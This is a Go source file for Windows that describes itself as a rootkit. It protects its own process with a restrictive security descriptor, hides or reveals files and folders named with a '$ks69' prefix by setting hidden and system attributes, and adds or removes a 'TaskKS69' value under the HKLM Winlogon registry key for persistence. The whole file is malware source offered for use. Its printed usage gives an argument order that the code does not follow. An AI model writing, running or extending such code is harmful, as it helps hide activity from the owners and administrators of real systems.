package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"log"
	"unsafe"
)

func SelfDefense() bool {
	hProcess, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, windows.GetCurrentProcessId())
	if err != nil {
		fmt.Println("Error opening process:", err)
		return false
	}
	defer windows.CloseHandle(hProcess)

	szSD := "D:P(A;;GA;;;SY)(A;;GA;;;BA)(D;;GA;;;BG)(D;;GA;;;AN)"

	var securityDescriptor *windows.SECURITY_DESCRIPTOR
	err = windows.ConvertStringSecurityDescriptorToSecurityDescriptor(
		szSD,
		windows.SDDL_REVISION_1,
		&securityDescriptor,
		nil,
	)
	if err != nil {
		fmt.Println("Error converting SDDL:", err)
		return false
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(securityDescriptor)))

	err = windows.SetKernelObjectSecurity(hProcess, windows.DACL_SECURITY_INFORMATION, securityDescriptor)
	if err != nil {
		fmt.Println("Error setting security:", err)
		return false
	}

	return true
}

func hideFile(filename string) error {
	path, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return fmt.Errorf("failed to convert filename to UTF-16: %v", err)
	}
	err = syscall.SetFileAttributes(path, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
	if err != nil {
		return fmt.Errorf("failed to set Super Hidden attributes: %v", err)
	}
	return nil
}

func showFile(filename string) error {
	path, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return fmt.Errorf("failed to convert filename to UTF-16: %v", err)
	}
	err = syscall.SetFileAttributes(path, syscall.FILE_ATTRIBUTE_NORMAL)
	if err != nil {
		return fmt.Errorf("failed to set normal attributes: %v", err)
	}
	return nil
}

func addToWinlogon(programPath string) error {
	keyPath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %v", err)
	}
	defer key.Close()

	valueName := "TaskKS69"
	err = key.SetStringValue(valueName, programPath)
	if err != nil {
		return fmt.Errorf("failed to set value: %v", err)
	}

	fmt.Printf("Value '%s' successfully added to registry.\n", programPath)
	return nil
}

func removeFromWinlogon() error {
	keyPath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %v", err)
	}
	defer key.Close()

	valueName := "TaskKS69"
	err = key.DeleteValue(valueName)
	if err != nil {
		return fmt.Errorf("failed to delete value: %v", err)
	}

	fmt.Println("Value successfully deleted from registry.")
	return nil
}

func main() {
	if !SelfDefense() {
		log.Fatal("Failed to configure process security.")
	}

	if len(os.Args) < 2 {
		fmt.Println("This rootkit hides files and folders with the '$ks69' prefix!")
		fmt.Println("Usage:")
		fmt.Println("  sigma.exe <path> <show|hide>")
		fmt.Println("  sigma.exe <programPath> winlogon")
		fmt.Println("  sigma.exe unwinlogon")
		return
	}

	action := os.Args[1]

	switch action {
	case "show", "hide":
		if len(os.Args) != 3 {
			fmt.Println("Usage: sigma.exe <path> <show|hide>")
			return
		}

		rootDir := os.Args[2]

		err := filepath.WalkDir(rootDir, func(path string, dirEntry os.DirEntry, err error) error {
			if err != nil {
				fmt.Printf("Error accessing path %s: %v\n", path, err)
				return nil
			}

			if strings.HasPrefix(dirEntry.Name(), "$ks69") {
				fmt.Printf("Processing: %s\n", path)

				switch action {
				case "hide":
					if err := hideFile(path); err != nil {
						fmt.Printf("Failed to hide %s: %v\n", path, err)
					}
				case "show":
					if err := showFile(path); err != nil {
						fmt.Printf("Failed to show %s: %v\n", path, err)
					}
				}
			}

			return nil
		})

		if err != nil {
			fmt.Printf("Error walking the directory: %v\n", err)
		}

		fmt.Printf("Files and folders with prefix '$ks69' have been processed. Action: %s\n", action)

	case "winlogon":
		if len(os.Args) != 3 {
			fmt.Println("Usage: sigma.exe <programPath> winlogon")
			return
		}

		programPath := os.Args[2]
		if err := addToWinlogon(programPath); err != nil {
			log.Fatalf("Failed to add to Winlogon: %v", err)
		}

	case "unwinlogon":
		if len(os.Args) != 2 {
			fmt.Println("Usage: sigma.exe unwinlogon")
			return
		}

		if err := removeFromWinlogon(); err != nil {
			log.Fatalf("Failed to remove from Winlogon: %v", err)
		}

	default:
		fmt.Println("Invalid action. Use 'show', 'hide', 'winlogon', or 'unwinlogon'.")
	}
}